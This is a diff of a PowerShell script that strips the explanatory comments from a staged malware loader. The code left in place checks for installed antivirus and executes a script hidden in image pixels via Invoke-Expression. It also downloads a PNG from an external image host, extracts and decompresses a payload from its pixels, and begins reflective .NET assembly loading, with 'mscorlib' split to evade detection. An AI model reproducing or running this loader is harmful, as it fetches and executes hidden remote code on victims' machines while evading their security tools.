@@ -1,4 +1,3 @@
-# 1. Antivirus Check and Conditional Stage
 $avInfo = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction SilentlyContinue;
 $avFlag = $false;
 
@@ -30,7 +29,6 @@ if($avInfo) {
             $x = 2;
             $y = 0;
             
-            # Extract hidden script
             while($byteIndex -lt $payloadSize1){
                 $currentPixel = $bitmap1.GetPixel($x, $y);
                 $payloadArray1[$byteIndex++] = $currentPixel.R;
@@ -44,7 +42,6 @@ if($avInfo) {
             $bitmap1.Dispose();
             $memStream1.Dispose();
             
-            # Execute hidden script
             $extractedScript = [System.Text.Encoding]::UTF8.GetString($payloadArray1);
             Invoke-Expression $extractedScript;
             $avFlag = $true;
@@ -53,7 +50,6 @@ if($avInfo) {
     };
 };
 
-# 2. Primary Payload Extraction
 Add-Type -AssemblyName System.Drawing;
 $urlPrefix2 = "https://";
 $imageUrl2 = "i.ibb.co/Mk72ZRQ6/ervqt4eoyg9.png";
@@ -86,7 +82,6 @@ for($y2=0; $y2 -lt $bitmap2.Height; $y2++){
 $bitmap2.Dispose();
 $memStream2.Dispose();
 
-# Trim to exact size and Decompress (GZip)
 $trimmedBytes = $byteList.ToArray()[0..($payloadSize2-1)];
 $compressedStream = New-Object IO.MemoryStream(,$trimmedBytes);
 $decompressedStream = New-Object IO.MemoryStream;
@@ -98,7 +93,6 @@ $compressedStream.Dispose();
 $finalPayload = $decompressedStream.ToArray();
 $decompressedStream.Dispose();
 
-# 3. Reflective Assembly Loading
 foreach($assembly in [AppDomain]::CurrentDomain.GetAssemblies()){
     if($assembly.GlobalAssemblyCache -and $assembly.Location.Contains('mscor'+'lib.dll')){
         foreach($method in $assembly.GetType(('System.Reflection.Assembly')).GetMethods('Public,Static')){
